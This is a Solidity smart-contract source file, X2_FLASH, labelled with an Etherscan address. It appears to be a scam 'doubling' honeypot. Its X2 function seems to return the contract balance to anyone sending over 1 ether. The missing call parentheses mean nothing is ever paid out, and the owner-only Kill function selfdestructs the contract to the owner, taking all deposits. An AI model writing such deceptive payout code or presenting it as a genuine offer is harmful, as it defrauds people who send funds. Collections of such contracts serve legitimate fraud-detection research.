// https://etherscan.io/address/0x2f30ff3428d62748a1d993f2cc6c9b55df40b4d7#code

pragma solidity ^0.4.19;

contract X2_FLASH
{
    address owner = msg.sender;

    function() public payable {}

    function X2()
    public
    payable
    {
        if(msg.value > 1 ether)
        {
            msg.sender.call.value(this.balance);
        }
    }

    function Kill()
    public
    payable
    {
        if(msg.sender==owner)
        {
            selfdestruct(owner);
        }
    }
}
